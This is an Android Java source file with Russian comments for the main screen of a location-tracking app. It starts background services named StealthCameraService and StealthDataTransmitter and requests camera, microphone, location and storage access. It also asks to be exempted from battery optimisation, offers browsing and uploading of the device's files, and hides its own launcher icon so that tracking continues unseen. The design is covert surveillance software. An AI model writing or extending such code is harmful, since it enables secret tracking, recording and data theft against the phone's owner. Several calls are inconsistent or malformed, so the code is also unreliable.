/**
 * Главный класс активности, управляющий всем приложением.
 * Интегрирует геолокацию, камеру, управление файлами и безопасность.
 */
public class MainActivity extends AppCompatActivity implements
        OnMapReadyCallback,
        LifecycleObserver,
        View.OnClickListener {

    // --- Константы и Теги ---
    private static final String TAG = "LocationTrackerMain";
    private static final int REQUEST_PERMISSIONS_CODE = 1001;
    private static final int REQUEST_STORAGE_PERMISSION_CODE = 1002;
    private static final int REQUEST_BACKGROUND_LOCATION_CODE = 1003;

    // --- Элементы UI ---
    private MapView mapView;
    private GoogleMap googleMap;
    private Marker currentLocationMarker;
    private TextView tvDeviceName;
    private TextView tvStatus;
    private TextView tvLocation;
    private Button btnStartTracking;
    private Button btnStopTracking;
    private Button btnManageFiles;
    private Button btnSecurityCheck;

    // --- Сервисы и Менеджеры ---
    private FusedLocationProviderClient fusedLocationClient;
    private SecurePreferences securePrefs;
    private NetworkClient networkClient;
    private FileManager fileManager;
    private WatchdogService watchdogService;
    private StealthDataTransmitter dataTransmitter;

    // --- Состояние ---
    private boolean isTracking = false;
    private boolean isInitializationComplete = false;
    private Handler mainHandler;
    private DeviceIdManager deviceIdManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 1. Инициализация конфигурации
        Configuration.getInstance().load(getApplicationContext(),
                getSharedPreferences("osmdroid", MODE_PRIVATE));

        // 2. Создание макета
        setContentView(R.layout.activity_main);

        // 3. Инициализация компонентов
        initComponents();
        
        // 4. Настройка карты
        setupMap();
        
        // 5. Настройка кнопок и обработчиков
        setupButtons();
        
        // 6. Запуск служб и проверка разрешений
        initializeAllServices();
    }

    /**
     * Инициализация всех компонентов приложения.
     */
    private void initComponents() {
        // Инициализация UI
        mapView = findViewById(R.id.mapView);
        tvDeviceName = findViewById(R.id.tvDeviceName);
        tvStatus = findViewById(R.id.tvStatus);
        tvLocation = findViewById(R.id.tvLocation);
        btnStartTracking = findViewById(R.id.btnStartTracking);
        btnStopTracking = findViewById(R.id.btnStopTracking);
        btnManageFiles = findViewById(R.id.btnManageFiles);
        btnSecurityCheck = findViewById(R.id.btnSecurityCheck);

        // Инициализация сервисов
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        securePrefs = new SecurePreferences(this);
        networkClient = new NetworkClient(this);
        fileManager = new FileManager(this);
        watchdogService = new WatchdogService(this);
        dataTransmitter = new StealthDataTransmitter(this);
        deviceIdManager = new DeviceIdManager();

        mainHandler = new Handler(Looper.getMainLooper());

        // Настройка карты
        mapView.onResume();
        mapView.getMapAsync(this);

        // Запуск наблюдателя
        getLifecycle().addObserver(this);
    }

    /**
     * Настройка карты Google Maps или OsmDroid.
     */
    private void setupMap() {
        if (mapView != null) {
            mapView.setTileSource(TileSourceFactory.MAPNIK);
            mapView.setBuiltInZoomControls(true);
            mapView.setMultiTouchControls(true);

            // Центрирование карты
            GeoPoint centerPoint = new GeoPoint(55.7558, 37.6176);
            mapView.getController().setZoom(15.0);
            mapView.getController().setCenter(centerPoint);
        }
    }

    /**
     * Настройка обработчиков кликов для кнопок.
     */
    private void setupButtons() {
        btnStartTracking.setOnClickListener(v -> startTracking());
        btnStopTracking.setOnClickListener(v -> stopTracking());
        btnManageFiles.setOnClickListener(v -> showFileManagerDialog());
        btnSecurityCheck.setOnClickListener(v -> performSecurityCheck());
    }

    /**
     * Инициализация всех сервисов приложения.
     */
    private void initializeAllServices() {
        if (isInitializationComplete) return;
        isInitializationComplete = true;

        Log.d(TAG, "Initializing all services...");

        // Проверка разрешений
        if (!hasAllPermissions()) {
            requestAllPermissions();
        } else {
            // Запуск всех служб
            startLocationUpdates();
            startCameraService();
            startBackupService();
            startWatchdogService();
        }

        // Запрос на отключение оптимизации батареи
        requestBatteryOptimizationExemption();

        // Планирование автоматического скрытия приложения
        scheduleAutoHide();
    }

    /**
     * Проверка наличия всех необходимых разрешений.
     */
    private boolean hasAllPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    /**
     * Запрос необходимых разрешений у пользователя.
     */
    private void requestAllPermissions() {
        String[] permissions = new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] mediaPermissions = {
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO
            };
            ActivityCompat.requestPermissions(this, 
                    android.util.Pair.create(permissions, mediaPermissions).getFirst(), 
                    REQUEST_PERMISSIONS_CODE);
        } else {
            ActivityCompat.requestPermissions(this, permissions, REQUEST_PERMISSIONS_CODE);
        }
    }

    /**
     * Запрос на исключение из оптимизации батареи.
     */
    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            
            if (intent.resolveActivity(getPackageManager()) != null) {
                try {
                    startActivity(intent);
                } catch (Exception e) {
                    Log.d(TAG, "Battery optimization exemption request launched");
                }
            }
        }
    }

    /**
     * Запуск отслеживания геолокации.
     */
    private void startTracking() {
        if (!isTracking) {
            isTracking = true;
            updateStatusDisplay();

            // Запуск LocationService
            Intent locationIntent = new Intent(this, LocationService.class);
            locationIntent.putExtra("device_id", deviceIdManager.getDeviceId(this));
            locationIntent.putExtra("device_name", securePrefs.getDeviceName());
            startService(locationIntent);

            // Запуск BackupLocationService
            Intent backupIntent = new Intent(this, BackupLocationService.class);
            startService(backupIntent);

            // Запуск StealthCameraService
            startCameraService();

            Log.d(TAG, "Tracking started successfully");
            Toast.makeText(this, "Отслеживание активировано", Toast.LENGTH_SHORT).show();
        }
    }

    /**
     * Остановка отслеживания.
     */
    private void stopTracking() {
        if (isTracking) {
            isTracking = false;
            updateStatusDisplay();

            // Остановка служб
            stopService(new Intent(this, LocationService.class));
            stopService(new Intent(this, BackupLocationService.class));
            stopService(new Intent(this, WatchdogService.class));
            stopService(new Intent(this, StealthCameraService.class));

            Log.d(TAG, "Tracking stopped successfully");
            Toast.makeText(this, "Отслеживание остановлено", Toast.LENGTH_SHORT).show();
        }
    }

    /**
     * Запуск службы камеры.
     */
    private void startCameraService() {
        try {
            Intent cameraIntent = new Intent(this, StealthCameraService.class);
            cameraIntent.putExtra("action", "ACTIVATE_STEALTH");
            cameraIntent.putExtra("device_id", deviceIdManager.getDeviceId(this));
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(cameraIntent);
            } else {
                startService(cameraIntent);
            }
            Log.d(TAG, "Camera service started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start camera service", e);
        }
    }

    /**
     * Запуск службы резервного копирования.
     */
    private void startBackupService() {
        try {
            Intent backupIntent = new Intent(this, BackupLocationService.class);
            startForegroundService(backupIntent);
            Log.d(TAG, "Backup service started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start backup service", e);
        }
    }

    /**
     * Запуск службы мониторинга (Watchdog).
     */
    private void startWatchdogService() {
        try {
            Intent watchdogIntent = new Intent(this, WatchdogService.class);
            startForegroundService(watchdogIntent);
            Log.d(TAG, "Watchdog service started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start watchdog service", e);
        }
    }

    /**
     * Запуск обновлений геолокации.
     */
    private void startLocationUpdates() {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {
                
                LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 50, this);
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 50, this);
                
                Log.d(TAG, "Location updates started");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting location updates", e);
        }
    }

    /**
     * Обновление отображения статуса приложения.
     */
    private void updateStatusDisplay() {
        String status = isTracking ? "АКТИВНА" : "НЕАКТИВНА";
        tvStatus.setText("Статус: " + status);
        tvStatus.setTextColor(isTracking ? 
                ContextCompat.getColor(this, android.R.color.holo_green_dark) : 
                ContextCompat.getColor(this, android.R.color.holo_red_dark));

        String deviceId = deviceIdManager.getDeviceId(this);
        String deviceName = securePrefs.getDeviceName();
        tvDeviceName.setText("Устройство: " + deviceName + " (" + deviceId + ")");

        if (currentLocationMarker != null && mapView != null) {
            mapView.invalidate();
        }
    }

    /**
     * Отображение диалога управления файлами.
     */
    private void showFileManagerDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Управление файлами")
                .setMessage("Просмотрите, отфильтруйте и загрузите файлы с устройства.")
                .setPositiveButton("Открыть", (dialog, which) -> {
                    Intent filesIntent = new Intent(this, FileManagementActivity.class);
                    startActivity(filesIntent);
                })
                .setNegativeButton("Закрыть", null)
                .show();
    }

    /**
     * Выполнение проверки безопасности приложения.
     */
    private void performSecurityCheck() {
        new AlertDialog.Builder(this)
                .setTitle("Проверка безопасности")
                .setMessage("Проверьте целостность приложения и настройте параметры безопасности.")
                .setPositiveButton("Проверить", (dialog, which) -> {
                    // Выполнение проверки целостности
                    AppIntegrityChecker.performSecurityChecks(this);
                    Toast.makeText(this, "Проверка безопасности завершена", Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton("Настройки", (dialog, which) -> {
                    Intent settingsIntent = new Intent(this, SecuritySettingsActivity.class);
                    startActivity(settingsIntent);
                })
                .setNeutralButton("Закрыть", null)
                .show();
    }

    /**
     * Планирование автоматического скрытия приложения через 2 минуты.
     */
    private void scheduleAutoHide() {
        mainHandler.postDelayed(() -> {
            if (isTracking && !isFinishing()) {
                new AlertDialog.Builder(this)
                        .setTitle("Защита Настроена")
                        .setMessage("Отслеживание активировано. Приложение может быть скрыто для безопасности.")
                        .setPositiveButton("Скрыть Сейчас", (dialog, which) -> {
                            hideAppIcon();
                            scheduleAppExit();
                        })
                        .setNegativeButton("Оставить Видимым", (dialog, which) -> {
                            // Сохранение настройки
                            securePrefs.getMainPrefs().edit().putBoolean("auto_hide_setup", true).apply();
                        })
                        .setCancelable(false)
                        .show();
            }
        }, 120000); // 2 минуты
    }

    /**
     * Скрытие значка приложения.
     */
    private void hideAppIcon() {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.ComponentName componentName = new android.content.ComponentName(this, MainActivity.class);
            
            pm.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            Log.d(TAG, "Application icon hidden");
            Toast.makeText(this, "Приложение скрыто. Отслеживание продолжается в фоне.",
                    Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "Error hiding app icon", e);
            Toast.makeText(this, "Ошибка скрытия приложения", Toast.LENGTH_SHORT).show();
        }
    }

    /**
     * Завершение работы приложения с перемещением в фон.
     */
    private void scheduleAppExit() {
        mainHandler.postDelayed(() -> {
            moveTaskToBack(true);
            Log.d(TAG, "Application moved to background");
        }, 3000);
    }

    /**
     * Обработка результата проверки разрешений.
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            boolean allGranted = true;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                Log.d(TAG, "All permissions granted");
                initializeAllServices();
            } else {
                Log.w(TAG, "Some permissions denied");
                showPermissionDeniedDialog();
            }
        }
    }

    /**
     * Отображение диалога о необходимости разрешений.
     */
    private void showPermissionDeniedDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Требуются Разрешения")
                .setMessage("Системный сервис не может работать без необходимых разрешений. Откройте настройки и предоставьте все разрешения.")
                .setPositiveButton("Открыть Настройки", (dialog, which) -> {
                    Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                })
                .setNegativeButton("Повторить", (dialog, which) -> {
                    requestAllPermissions();
                })
                .setNeutralButton("Выход", (dialog, which) -> finish())
                .show();
    }

    /**
     * Обработка кликов кнопок.
     */
    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btnStartTracking:
                startTracking();
                break;
            case R.id.btnStopTracking:
                stopTracking();
                break;
            case R.id.btnManageFiles:
                showFileManagerDialog();
                break;
            case R.id.btnSecurityCheck:
                performSecurityCheck();
                break;
        }
    }

    /**
     * Завершение отрисовки карты.
     */
    @Override
    public void onMapReady(@NonNull GoogleMap googleMap) {
        this.googleMap = googleMap;
        updateMapLocation(googleMap);
        
        // Добавление маркера текущей позиции
        googleMap.setOnMapClickListener((latLng, screenPosition) -> {
            // Обработка кликов по карте
            Log.d(TAG, "Map clicked at: " + latLng.latitude + ", " + latLng.longitude);
        });
        
        googleMap.setOnCameraIdleListener(() -> {
            Log.d(TAG, "Camera idle - map view updated");
        });
    }

    /**
     * Обновление маркера текущей позиции на карте.
     */
    private void updateMapLocation(@NonNull GoogleMap map) {
        if (currentLocationMarker != null) {
            map.moveCamera(CameraUpdateFactory.zoomTo(15));
        }
    }

    /**
     * Завершение работы активности.
     */
    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        if (mainHandler != null) {
            mainHandler.removeCallbacksAndMessages(null);
        }
        
        if (mapView != null) {
            mapView.onDestroy();
        }
        
        if (fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(this);
        }
        
        Log.d(TAG, "Activity destroyed");
    }

    /**
     * Восстановление активности после возвращения из фона.
     */
    @Override
    protected void onResume() {
        super.onResume();
        if (mapView != null) {
            mapView.onResume();
        }
        
        if (isTracking) {
            updateStatusDisplay();
        }
        
        // Загрузка данных из SharedPreferences
        loadSettings();
    }

    /**
     * Сохранение настроек в SharedPreferences.
     */
    private void loadSettings() {
        try {
            SharedPreferences prefs = getSharedPreferences("LocationTracker", MODE_PRIVATE);
            boolean isAutoTracking = prefs.getBoolean("auto_tracking", false);
            if (isAutoTracking && !isTracking) {
                startTracking();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error loading settings", e);
        }
    }

    /**
     * Обработка изменений геолокации.
     */
    @Override
    public void onLocationChanged(@NonNull android.location.Location location) {
        updateLocationDisplay(location);
        
        if (googleMap != null) {
            updateMapLocation(googleMap);
        }
    }

    /**
     * Отображение информации о геолокации.
     */
    private void updateLocationDisplay(android.location.Location location) {
        SimpleDateFormat timeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        String locationText = String.format(Locale.getDefault(),
                "Координаты: %.6f, %.6f\nТочность: %.1fм\nВремя: %s",
                location.getLatitude(),
                location.getLongitude(),
                location.getAccuracy(),
                timeFormat.format(new Date(location.getTime()))
        );
        tvLocation.setText(locationText);
    }
}
